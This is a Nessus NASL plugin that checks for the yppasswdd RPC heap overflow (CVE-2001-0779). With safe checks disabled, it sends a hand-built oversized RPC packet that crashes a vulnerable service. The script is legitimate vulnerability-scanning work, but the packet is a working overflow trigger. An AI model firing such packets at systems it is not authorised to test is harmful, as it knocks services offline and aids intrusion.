#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# This script is released under the GPLv2
#

if(description)
{
 script_id(10684);
 script_bugtraq_id(2763);
script_cve_id("CVE-2001-0779");
 script_version ("$Revision: 1.24 $");

 
 name["english"] = "yppasswdd overflow";
 name["francais"] = "yppasswdd overflow";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
The remote RPC service 100009 (yppasswdd) is vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host.

Solution : disable this service if you don't use
it, or contact Sun for a patch
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "heap overflow through yppasswdd";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK); 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 exit(0);
}

include("misc_func.inc");

port = get_rpc_port(program:100009, protocol:IPPROTO_UDP);
if(port)
{
  if(!safe_checks())
  {
  if(get_port_state(port))
  {
   soc = open_sock_udp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    crp = crap(796);
    
    req = raw_string(0x56, 0x6C, 0x9F, 0x6B, 
    		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		     0x00, 0x01, 0x86, 0xA9, 0x00, 0x00, 0x00, 0x01,
		     0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x03, 0x20, 0x80, 0x1C, 0x40, 0x11
		     ) + crp + raw_string(0x00, 0x00, 0x00, 0x02,
		     0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03,
		     0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x03,
		     0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x02,
		     0x61, 0x61, 0x00, 0x00);
     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     if(r)
     {
      # if length(r) == 28, then the overflow did succeed. However,
      # I prefer to re-make a call to getrpcport(), that's safer
      # (who knows what exotic yppasswdd can reply ?)
      sleep(1);
      newport = get_rpc_port(program:100009, protocol:IPPROTO_UDP);
      set_kb_item(name:"rpc/yppasswd/sun_overflow", value:TRUE);
      if(!newport)
       security_hole(port:port, protocol:"udp");
     }
     close(soc);
   }
  }
 }
 else
 {
  desc = "
The remote RPC service 100009 (yppasswdd) may be vulnerable
to a buffer overflow which would allow any user to obtain a root
shell on this host.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : disable this service if you don't use
it, or contact Sun for a patch
Risk factor : High";
  set_kb_item(name:"rpc/yppasswd/sun_overflow", value:TRUE);
  security_hole(port:port, data:desc, protocol:"udp");
 }
}
